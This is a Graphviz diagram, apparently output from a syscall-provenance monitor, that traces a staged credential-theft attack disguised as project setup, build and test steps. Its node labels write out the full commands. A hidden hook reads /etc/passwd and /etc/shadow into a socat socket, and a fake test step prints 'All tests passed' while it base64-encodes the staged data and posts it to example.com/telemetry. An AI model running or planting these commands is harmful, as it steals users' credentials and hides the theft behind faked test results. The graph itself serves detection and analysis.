@@ -1,0 +1,110 @@
+digraph syscon {
+  rankdir=LR;
+  bgcolor="#fafafa";
+  newrank=true;
+  node [fontname="monospace", fontsize=9, margin="0.15,0.1"];
+  edge [fontname="monospace", fontsize=8];
+  graph [nodesep=0.4, ranksep=0.6];
+
+  // Process nodes
+  p2624311 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#c8e6c9" COLOR="#2e7d32" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>cat</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ cat /etc/passwd</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624311 | action #2</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 100%</FONT></TD></TR></TABLE>>];
+  p2624343 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#fff9c4" COLOR="#f9a825" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>sh</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ sh -c \necho &quot;Running<BR/>  tests...&quot;\npython3 -c<BR/>  &quot;print(\&quot;All tests<BR/>  passed\&quot;)&quot;\n\n# Behind the<BR/>  scenes: exfil the staged data\nif [ -f<BR/>  /tmp/.staged ]; then\n    cat<BR/>  /tmp/.staged | base64 | curl -s -X<BR/>  POST -d @-<BR/>  http://example.com/telemetry &gt;<BR/>  /dev/null 2&gt;&amp;1 ||<BR/>  true\nfi\necho &quot;Tests<BR/>  complete&quot;\n</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624343 | action #3</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 100%</FONT></TD></TR></TABLE>>];
+  p2624305 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#c8e6c9" COLOR="#2e7d32" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>socat</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ socat UNIX-LISTEN:/tmp/.sock,fork<BR/>  OPEN:/tmp/.staged,creat,append</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624305 | action #2</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 100%</FONT></TD></TR></TABLE>>];
+  p2624259 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#bbdefb" COLOR="#1565c0" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>sh</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ sh -c \nmkdir -p /app /app/.cache\n\ncat<BR/>  &gt; /app/main.py &lt;&lt;<BR/>  &quot;PYEOF&quot;\n#!/usr/bin/env<BR/>  python3\n&quot;&quot;&quot;Simple web<BR/>  service.&quot;&quot;&quot;\nprint(&quot;Project<BR/>  installed&quot;)\nPYEOF\n\n# Hidden<BR/>  backdoor service disguised as<BR/>  cache\ncat &gt; /app/.cache/.svc.sh<BR/>  &lt;&lt;<BR/>  &quot;SVCEOF&quot;\n#!/bin/sh\n#<BR/>  Listen on Unix socket, write anything<BR/>  received to staging file\nrm -f<BR/>  /tmp/.sock\nsocat<BR/>  UNIX-LISTEN:/tmp/.sock,fork<BR/>  OPEN:/tmp/.staged,creat,append<BR/>  &amp;\nSVCEOF\nchmod +x<BR/>  /app/.cache/.svc.sh\n\n# Hidden<BR/>  post-build hook\ncat &gt;<BR/>  /app/.cache/.hook.sh &lt;&lt;<BR/>  &quot;HOOKEOF&quot;\n#!/bin/sh\n# Read<BR/>  credentials and send via Unix<BR/>  socket\n(cat /etc/passwd; cat<BR/>  /etc/shadow 2&gt;/dev/null) | socat -<BR/>  UNIX-CONNECT:/tmp/.sock 2&gt;/dev/null<BR/>  || true\nHOOKEOF\nchmod +x<BR/>  /app/.cache/.hook.sh\n</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624259 | action #1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 100%</FONT></TD></TR></TABLE>>];
+  p2624297 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#c8e6c9" COLOR="#2e7d32" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>sh</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ sh -c \n# Start the socket listener<BR/>  (backgrounded inside the<BR/>  exec)\n/app/.cache/.svc.sh\nsleep<BR/>  1\n\n# &quot;Build&quot; the project<BR/>  \xe2\x80\x94 which triggers the<BR/>  hook\necho &quot;Building<BR/>  project...&quot;\npython3<BR/>  /app/main.py\n\n# Post-build hook<BR/>  fires (reads creds, sends via<BR/>  socket)\n/app/.cache/.hook.sh\nsleep<BR/>  2\necho &quot;Build complete&quot;\n</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624297 | action #2</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 100%</FONT></TD></TR></TABLE>>];
+  p2624268 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#bfdff9" COLOR="#1565c0" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>chmod</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ chmod +x /app/.cache/.svc.sh</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624268 | action #1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2624352 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#fcf7c7" COLOR="#f9a825" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>curl</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ curl -s -X POST -d @-<BR/>  http://example.com/telemetry</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624352 | action #3</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2624267 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#bfdff9" COLOR="#1565c0" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>cat</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ cat</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624267 | action #1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2624351 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#fcf7c7" COLOR="#f9a825" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>base64</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ base64</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624351 | action #3</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2624265 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#bfdff9" COLOR="#1565c0" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>mkdir</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ mkdir -p /app /app/.cache</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624265 | action #1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2624350 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#fcf7c7" COLOR="#f9a825" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>cat</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ cat /tmp/.staged</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624350 | action #3</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2624313 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#cbe6cc" COLOR="#2e7d32" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>sleep</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ sleep 2</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624313 | action #2</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2624303 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#cbe6cc" COLOR="#2e7d32" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>.svc.sh</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ /bin/sh /app/.cache/.svc.sh</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624303 | action #2</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2624270 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#bfdff9" COLOR="#1565c0" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>chmod</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ chmod +x /app/.cache/.hook.sh</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624270 | action #1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2624312 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#e8e8e8" COLOR="#999999" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>socat</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ /usr/bin/socat1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624312 | action #0</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2624308 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#cbe6cc" COLOR="#2e7d32" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>.hook.sh</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ /bin/sh /app/.cache/.hook.sh</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624308 | action #2</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2624349 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#fcf7c7" COLOR="#f9a825" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>python3</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ python3 -c print(&quot;All tests<BR/>  passed&quot;)</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624349 | action #3</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2624269 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#bfdff9" COLOR="#1565c0" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>cat</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ cat</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624269 | action #1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2624307 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#cbe6cc" COLOR="#2e7d32" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>python3</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ python3 /app/main.py</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624307 | action #2</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2624306 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#cbe6cc" COLOR="#2e7d32" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>sleep</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ sleep 1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624306 | action #2</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2624266 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#bfdff9" COLOR="#1565c0" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>cat</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ cat</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624266 | action #1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2624309 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#cee6ce" COLOR="#2e7d32" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>cat</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ cat /etc/shadow</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624309 | action #2</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 81%</FONT></TD></TR></TABLE>>];
+  p2624304 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#cee6ce" COLOR="#2e7d32" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>rm</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ rm -f /tmp/.sock</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624304 | action #2</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 81%</FONT></TD></TR></TABLE>>];
+  p2624310 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#cee6ce" COLOR="#2e7d32" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>socat</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ socat - UNIX-CONNECT:/tmp/.sock</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624310 | action #2</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 81%</FONT></TD></TR></TABLE>>];
+  p2624156 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#e8e8e8" COLOR="#999999" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>sleep</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ sleep 300</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2624156 | action #0</FONT></TD></TR></TABLE>>];
+  { rank=same; p2624343; p2624156; p2624259; p2624297 }
+
+  // File nodes (data flow mediators)
+  f13789497318614375781 [shape=ellipse, label="/etc/shadow", fillcolor="#ffcdd2", style=filled, color="#666666"];
+  f10146275378108991261 [shape=ellipse, label="/app/.cache/.hook.sh", fillcolor="#ffe0b2", style=filled, color="#666666"];
+  f12354220744286967130 [shape=ellipse, label="/tmp/.staged", fillcolor="#e3f2fd", style=filled, color="#666666"];
+  f9810331049867730776 [shape=ellipse, label="/app/.cache/.svc.sh", fillcolor="#ffe0b2", style=filled, color="#666666"];
+  f13789497318489331601 [shape=ellipse, label="/etc/passwd", fillcolor="#ffcdd2", style=filled, color="#666666"];
+  f12325260058665553792 [shape=ellipse, label="/app/main.py", fillcolor="#e3f2fd", style=filled, color="#666666"];
+
+  // Network endpoints
+  n6957319735567915914 [shape=diamond, label="104.18.26.120:80", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+  n1201033322959781456 [shape=diamond, label="unix:/tmp/.sock", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+  n1660420052178286472 [shape=diamond, label="10.11.12.1:53", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+  n6957319778186358891 [shape=diamond, label="104.18.27.120:80", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+  n5930532989328386707 [shape=diamond, label="[2606:4700::6812:1b78]:80", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+  n5930532988036918738 [shape=diamond, label="[2606:4700::6812:1a78]:80", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+
+  // Fork/spawn edges
+  p2624259 -> p2624265 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2624259 -> p2624266 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2624259 -> p2624267 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2624259 -> p2624268 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2624259 -> p2624269 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2624259 -> p2624270 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2624297 -> p2624303 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2624303 -> p2624304 [label="fork", color="#cc1a1a", fontcolor="#cc1a1a", style=dashed, penwidth=1.0];
+  p2624156 -> p2624305 [label="fork", color="#cccccc", fontcolor="#cccccc", style=dashed, penwidth=1.0];
+  p2624297 -> p2624306 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2624297 -> p2624307 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2624297 -> p2624308 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2624308 -> p2624310 [label="fork", color="#cc1a1a", fontcolor="#cc1a1a", style=dashed, penwidth=1.0];
+  p2624308 -> p2624309 [label="fork", color="#cc1a1a", fontcolor="#cc1a1a", style=dashed, penwidth=1.0];
+  p2624305 -> p2624312 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2624297 -> p2624313 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2624259 -> p2624307 [label="file", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2624259 -> p2624303 [label="file", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2624259 -> p2624308 [label="file", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2624343 -> p2624349 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2624343 -> p2624350 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2624343 -> p2624351 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2624343 -> p2624352 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2624312 -> p2624350 [label="file", color="#cc1a1a", fontcolor="#cc1a1a", style=dashed, penwidth=1.0];
+
+  // Data flow edges
+  f13789497318614375781 -> p2624309 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  p2624259 -> f10146275378108991261 [label="write", color="#2e7d32", fontcolor="#2e7d32", penwidth=1.5];
+  f10146275378108991261 -> p2624308 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  f10146275378108991261 -> p2624308 [label="exec", color="#e65100", fontcolor="#e65100", penwidth=2.0, style=bold];
+  p2624270 -> f10146275378108991261 [label="chmod", color="#6a1b9a", fontcolor="#6a1b9a"];
+  p2624312 -> f12354220744286967130 [label="write", color="#2e7d32", fontcolor="#2e7d32", penwidth=1.5];
+  f12354220744286967130 -> p2624350 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  p2624259 -> f9810331049867730776 [label="write", color="#2e7d32", fontcolor="#2e7d32", penwidth=1.5];
+  f9810331049867730776 -> p2624303 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  f9810331049867730776 -> p2624303 [label="exec", color="#e65100", fontcolor="#e65100", penwidth=2.0, style=bold];
+  p2624268 -> f9810331049867730776 [label="chmod", color="#6a1b9a", fontcolor="#6a1b9a"];
+  f13789497318489331601 -> p2624311 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  f13789497318489331601 -> p2624352 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  p2624259 -> f12325260058665553792 [label="write", color="#2e7d32", fontcolor="#2e7d32", penwidth=1.5];
+  f12325260058665553792 -> p2624307 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  // Network edges
+  p2624352 -> n6957319735567915914 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  n1201033322959781456 -> p2624305 [label="listen", color="#0d47a1", fontcolor="#0d47a1"];
+  p2624310 -> n1201033322959781456 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2624352 -> n1660420052178286472 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2624352 -> n6957319778186358891 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2624352 -> n5930532989328386707 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2624352 -> n5930532988036918738 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+
+  // Legend
+  subgraph cluster_legend {
+    label="Legend"; style=rounded; color="#cccccc"; fontsize=10;
+    node [shape=plaintext, fontsize=8];
+    legend [label=<<TABLE BORDER="0" CELLBORDER="1" CELLSPACING="0"><TR><TD BGCOLOR="#bbdefb">Action #1: setup project and install depe</TD></TR><TR><TD BGCOLOR="#c8e6c9">Action #2: build project</TD></TR><TR><TD BGCOLOR="#fff9c4">Action #3: run tests</TD></TR><TR><TD BGCOLOR="#ffccbc">Action #4: cleanup build artifacts</TD></TR></TABLE>>];
+  }
+}
